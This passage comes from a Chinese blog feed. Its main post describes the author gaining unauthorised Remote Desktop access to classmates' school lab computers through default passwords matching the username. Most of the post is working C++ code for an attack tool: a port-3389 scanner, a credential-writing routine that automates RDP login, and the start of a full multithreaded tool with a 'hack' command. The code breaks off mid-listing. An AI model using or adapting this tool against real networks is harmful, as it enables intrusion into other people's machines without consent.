Bytes&quot;</span>;</span><br><span class="language-javascript"></span><br><span class="language-javascript">                        <span class="hljs-keyword">const</span> i = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">log</span>(bytes) / <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1000</span>));</span><br><span class="language-javascript">                        <span class="hljs-keyword">return</span> <span class="hljs-built_in">parseFloat</span>((bytes / <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(<span class="hljs-number">1000</span>, i)).<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>)) + <span class="hljs-string">&quot; &quot;</span> + [<span class="hljs-string">&quot;Bytes&quot;</span>, <span class="hljs-string">&quot;KB&quot;</span>, <span class="hljs-string">&quot;MB&quot;</span>, <span class="hljs-string">&quot;GB&quot;</span>, <span class="hljs-string">&quot;TB&quot;</span>, <span class="hljs-string">&quot;PB&quot;</span>, <span class="hljs-string">&quot;WTF&quot;</span>][i];</span><br><span class="language-javascript">                    &#125;,</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">            &#125;);</span><br><span class="language-javascript">        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>前端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用远程桌面连接的弱口令漏洞称霸学校机房</title>
    <link href="/articles/h3class_rdp_exploit/"/>
    <url>/articles/h3class_rdp_exploit/</url>
    
    <content type="html"><![CDATA[<h1 id="默认密码引发的弱口令漏洞"><a href="#默认密码引发的弱口令漏洞" class="headerlink" title="默认密码引发的弱口令漏洞"></a>默认密码引发的弱口令漏洞</h1><p>一次C语言课，闲的无聊，想找点乐子，于是抱着试一试的心态打开了远程桌面连接</p><p>输入旁边同学的IP地址和默认用户名，尝试连接</p><p>又抱着试一试的心态随便输入了一个和用户名相同的密码，嘿！还真连接上了</p><p>妥妥的弱口令漏洞啊！我想，要是编写一个自动化利用脚本不得称霸整个机房！</p><h1 id="自动化利用"><a href="#自动化利用" class="headerlink" title="自动化利用"></a>自动化利用</h1><h2 id="网段扫描"><a href="#网段扫描" class="headerlink" title="网段扫描"></a>网段扫描</h2><p>整个机房都在同一个网段中，扫描网段中所有3389端口开放的主机即可</p><p>携带一个专业的扫描器未免有点过于笨重，所以这里就自己实现一个简易的端口扫描器</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title">IsPortOpen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* ip, <span class="hljs-type">uint16_t</span> port)</span> </span>&#123;<br>    WSADATA wsaData;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-type">int</span> res = <span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsaData)) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;WSAStartup failed：&quot;</span> &lt;&lt; res &lt;&lt; std::endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    SOCKET sock = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);<br>    <span class="hljs-keyword">if</span> (sock == INVALID_SOCKET) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;socket failed：&quot;</span> &lt;&lt; <span class="hljs-built_in">WSAGetLastError</span>() &lt;&lt; std::endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    TIMEVAL timeout = &#123; <span class="hljs-number">0</span> &#125;;<br>    timeout.tv_sec = <span class="hljs-number">3</span>;<br>    timeout.tv_usec = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> mode = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-type">int</span> result = <span class="hljs-built_in">ioctlsocket</span>(sock, FIONBIO, &amp;mode) != NO_ERROR) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;ioctlsocket failed：&quot;</span> &lt;&lt; result &lt;&lt; std::endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    sockaddr_in serv_addr&#123;&#125;;<br>    serv_addr.sin_family = AF_INET;<br>    serv_addr.sin_addr.s_addr = <span class="hljs-built_in">inet_addr</span>(ip);<br>    serv_addr.sin_port = <span class="hljs-built_in">htons</span>(port);<br><br>    <span class="hljs-built_in">connect</span>(sock, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;serv_addr, <span class="hljs-built_in">sizeof</span>(serv_addr));<br><br>    mode = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-type">int</span> result = <span class="hljs-built_in">ioctlsocket</span>(sock, FIONBIO, &amp;mode) != NO_ERROR) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;ioctlsocket failed：&quot;</span> &lt;&lt; result &lt;&lt; std::endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    fd_set Write, Err;<br>    <span class="hljs-built_in">FD_ZERO</span>(&amp;Write);<br>    <span class="hljs-built_in">FD_ZERO</span>(&amp;Err);<br>    <span class="hljs-built_in">FD_SET</span>(sock, &amp;Write);<br>    <span class="hljs-built_in">FD_SET</span>(sock, &amp;Err);<br><br>    <span class="hljs-type">bool</span> result = <span class="hljs-literal">false</span>;<br>    <span class="hljs-built_in">select</span>(<span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, &amp;Write, &amp;Err, &amp;timeout);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FD_ISSET</span>(sock, &amp;Write)) &#123;<br>        result = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">closesocket</span>(sock);<br>    <span class="hljs-built_in">WSACleanup</span>();<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="RDP自动登录"><a href="#RDP自动登录" class="headerlink" title="RDP自动登录"></a>RDP自动登录</h2><p>每次登录都要手动输入账号和密码未免有点麻烦，可以编写程序对此过程自动化</p><p>mstsc命令行并不支持自动登录，不过可以通过创建凭据来间接实现自动登录</p><p>参考<a href="https://www.cnblogs.com/5201351/p/17535580.html">https://www.cnblogs.com/5201351/p/17535580.html</a></p><p><img src="/articles/h3class_rdp_exploit/1.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title">CreateRDPCredA</span><span class="hljs-params">(string ip, string username, wstring password)</span> </span>&#123;<br>    CREDENTIALA credential = &#123; <span class="hljs-number">0</span> &#125;;<br>    credential.Type = CRED_TYPE_DOMAIN_PASSWORD;<br>    ip = <span class="hljs-string">&quot;TERMSRV/&quot;</span> + ip;<br>    credential.TargetName = (LPSTR)ip.<span class="hljs-built_in">c_str</span>();<br>    credential.UserName = (LPSTR)username.<span class="hljs-built_in">c_str</span>();<br><br>    <span class="hljs-comment">//按API文档所述，密码必须使用UTF-16编码，所以这里用wstring</span><br>    credential.CredentialBlob = (LPBYTE)password.<span class="hljs-built_in">c_str</span>();<br>    credential.CredentialBlobSize = password.<span class="hljs-built_in">size</span>() * <span class="hljs-number">2</span>;<br>    credential.Persist = CRED_PERSIST_SESSION;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">CredWriteA</span>(&amp;credential, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><p>包含用户界面，CIDR地址解析，多线程扫描，自动登录RDP的完整代码</p><p>用法示例：</p><p>扫描整个网段（scan）：<code>s 192.168.0.0/24</code></p><p>扫描单个主机（check）：<code>c 192.168.0.111</code></p><p>自动登录RDP（hack）：<code>h 192.168.0.111</code></p><p><img src="/articles/h3class_rdp_exploit/2.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mutex&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sstream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;thread&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;wincred.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;Ws2_32.lib&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;Advapi32.lib&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> <span class="hljs-keyword">warning</span>(disable : 4996)</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br>HANDLE hConsole;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CONSOLE_COLOR_RED(statement) do &#123;\</span><br><span class="hljs-meta">    SetConsoleTextAttribute(hConsole, 4);\</span><br><span class="hljs-meta">    statement;\</span><br><span class="hljs-meta">    SetConsoleTextAttribute(hConsole, 7);\</span><br><span class="hljs-meta">&#125; while (0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CONSOLE_COLOR_GREEN(statement) do &#123;\</span><br><span class="hljs-meta">    SetConsoleTextAttribute(hConsole, 2);\</span><br><span class="hljs-meta">    statement;\</span><br><span class="hljs-meta">    SetConsoleTextAttribute(hConsole, 7);\</span><br><span class="hljs-meta">&#125; while (0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CONSOLE_COLOR_YELLOW(statement) do &#123;\</span><br><span class="hljs-meta">    SetConsoleTextAttribute(hConsole, 6);\</span><br><span class="hljs-meta">    statement;\</span><br><span class="hljs-meta">    SetConsoleTextAttribute(hConsole, 7);\</span><br><span class="hljs-meta">&#125; while (0)</span><br><br><span class="hljs-function"><span class="hljs-type">static</span> vector&lt;string&gt; <span class="hljs-title">StringTokenizer</span><span class="hljs-params">(<span class="hljs-type">const</span> string&amp; s)</span> </span>&#123;<br>    vector&lt;string&gt; tokens;<br>    string token;<br>    <span class="hljs-type">bool</span> inQuotes = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-built_in">size</span>(); ++i) &#123;<br>        <span class="hljs-type">char</span> c = s[i];<br><br>        <span class="hljs-comment">// Toggle inQuotes flag when encountering double quotes</span><br>        <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;&quot;&#x27;</span>) &#123;<br>            inQuotes = !inQuotes;<br>            <span class="hljs-keyword">continue</span>; <span class="hljs-comment">// Skip the quote character itself</span><br>        &#125;<br><br>        <span class="hljs-comment">// If inside quotes, add character to current token</span><br>        <span class="hljs-keyword">if</span> (inQuotes) &#123;<br>            token += c;<br>        &#125;<br>        <span class="hljs-comment">// If not inside quotes, check for delimiters (space or tab)</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27; &#x27;</span> || c == <span class="hljs-string">&#x27;\t&#x27;</span>) &#123;<br>            <span class="hljs-keyword">if</span> (!token.<span class="hljs-built_in">empty</span>()) &#123;<br>                tokens.<span class="hljs-built_in">push_back</span>(token);<br>                token.<span class="hljs-built_in">clear</span>();<br>            &#125;<br>            <span class="hljs-comment">// Continue to skip multiple spaces/tabs</span><br>        &#125;<br>        <span class="hljs-comment">// Add character to the current token if it&#x27;s not a delimiter</span><br>        <span class="hljs-keyword">else</span> &#123;<br>            token += c;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// Add the last token if any</span><br>    <span class="hljs-keyword">if</span> (!token.<span class="hljs-built_in">empty</span>()) &#123;<br>        tokens.<span class="hljs-built_in">push_back</span>(token);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> tokens;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">_CIDRParser</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">SetCIDR</span><span class="hljs-params">(string cidr)</span> </span>&#123;<br>        <span class="hljs-type">size_t</span> slash = cidr.<span class="hljs-built_in">find_last_of</span>(<span class="hljs-string">&#x27;/&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (slash == std::string::npos) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-type">uint8_t</span> mask = <span class="hljs-built_in">stoi</span>(cidr.<span class="hljs-built_in">substr</span>(slash + <span class="hljs-number">1</span>));<br>        cidr = cidr.<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>, slash);<br>        <span class="hljs-keyword">if</span> (mask &gt; <span class="hljs-number">32</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-type">uint8_t</span> ip[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>        <span class="hljs-type">size_t</span> start = <span class="hljs-number">0</span>, end = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i) &#123;<br>            end = cidr.<span class="hljs-built_in">find</span>(<span class="hljs-string">&#x27;.&#x27;</span>, start);<br>            <span class="hljs-keyword">if</span> (end == std::string::npos &amp;&amp; i &lt; <span class="hljs-number">3</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>            ip[i] = std::<span class="hljs-built_in">stoi</span>(cidr.<span class="hljs-built_in">substr</span>(start, end - start));<br>            start = end + <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-type">uint32_t</span> startAddress = ((ip[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">24</span>) | (ip[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">16</span>) | (ip[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">8</span>) | ip[<span class="hljs-number">3</span>]) &amp; (<span class="hljs-number">0xFFFFFFFF</span> &lt;&lt; (<span class="hljs-number">32</span> - mask));<br>        _endAddress = startAddress | (<span class="hljs-number">0xFFFFFFFF</span> &gt;&gt; mask);<br>        _currentAddress = startAddress;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-function">string <span class="hljs-title">NextSubAddress</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-function">lock_guard&lt;mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(mtx)</span></span>;<br><br>        string result = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span> (_currentAddress &lt;= _endAddress) &#123;<br>            ostringstream oss;<br>            oss &lt;&lt; ((_currentAddress &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-string">&#x27;.&#x27;</span><br>                &lt;&lt; ((_currentAddress &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-string">&#x27;.&#x27;</span><br>                &lt;&lt; ((_currentAddress &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-string">&#x27;.&#x27;</span><br>                &lt;&lt; (_currentAddress &amp; <span class="hljs-number">0xFF</span>);<br><br>            _currentAddress++;<br><br>           result = oss.<span class="hljs-built_in">str</span>();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-keyword">mutable</span> mutex mtx;<br>    <span class="hljs-type">uint32_t</span> _endAddress = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint32_t</span> _currentAddress = <span class="hljs-number">0</span>;<br>&#125;CIDRParser;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title">IsPortOpen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* ip, <span class="hljs-type">uint16_t</span> port)</span> </span>&#123;<br>    WSADATA wsaData;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-type">int</span> res = <span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsaData)) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;WSAStartup failed：&quot;</span> &lt;&lt; res &lt;&lt; std::endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    SOCKET sock = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);<br>    <span class="hljs-keyword">if</span> (sock == INVALID_SOCKET) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;socket failed：&quot;</span> &lt;&lt; <span class="hljs-built_in">WSAGetLastError</span>() &lt;&lt; std::endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    TIMEVAL timeout = &#123; <span class="hljs-number">0</span> &#125;;<br>    timeout.tv_sec = <span class="hljs-number">3</span>;<br>    timeout.tv_usec = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> mode = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-type">int</span> result = <span class="hljs-built_in">ioctlsocket</span>(sock, FIONBIO, &amp;mode) != NO_ERROR) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;ioctlsocket failed：&quot;</span> &lt;&lt; result &lt;&lt; std::endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    sockaddr_in serv_addr&#123;&#125;;<br>    serv_addr.sin_family = AF_INET;<br>    serv_addr.sin_addr.s_addr = <span class="hljs-built_in">inet_addr</span>(ip);<br>    serv_addr.sin_port = <span class="hljs-built_in">htons</span>(port);<br><br>    <span class="hljs-built_in">connect</span>(sock, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;serv_addr, <span class="hljs-built_in">sizeof</span>(serv_addr));<br><br>    mode = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-type">int</span> result = <span class="hljs-built_in">ioctlsocket</span>(sock, FIONBIO, &amp;mode) != NO_ERROR) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;ioctlsocket failed：&quot;</span> &lt;&lt; result &lt;&lt; std::endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    fd_set Write, Err;<br>    <span class="hljs-built_in">FD_ZERO</span>(&amp;Write);<br>    <span class="hljs-built_in">FD_ZERO</span>(&amp;Err);<br>    <span class="hljs-built_in">FD_SET</span>(sock, &amp;Write);<br>    <span class="hljs-built_in">FD_SET</span>(sock, &amp;Err);<br><br>    <span class="hljs-type">bool</span> result = <span class="hljs-literal">false</span>;<br>    <span class="hljs-built_in">select</span>(<span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, &amp;Write, &amp;Err, &amp;timeout);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FD_ISSET</span>(sock, &amp;Write)) &#123;<br>        result = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">closesocket</span>(sock);<br>    <span class="hljs-built_in">WSACleanup</span>();<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">Scanner</span><span class="hljs-params">()</span> </span>&#123;<br>    string address = CIDRParser.<span class="hljs-built_in">NextSubAddress</span>();<br>    <span class="hljs-keyword">while</span> (!address.<span class="hljs-built_in">empty</span>()) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsPortOpen</span>(address.<span class="hljs-built_in">c_str</span>(), <span class="hljs-number">3389</span>)) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, address.<span class="hljs-built_in">c_str</span>());<br>        &#125;<br>    <br>        address = CIDRParser.<span class="hljs-built_in">NextSubAddress</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title">CreateRDPCredA</span><span class="hljs-params">(string ip, string username, wstring password)</span> </span>&#123;<br>    CREDENTIALA credential = &#123; <span class="hljs-number">0</span> &#125;;<br>    credential.Type = CRED_TYPE_DOMAIN_PASSWORD;<br>    ip = <span 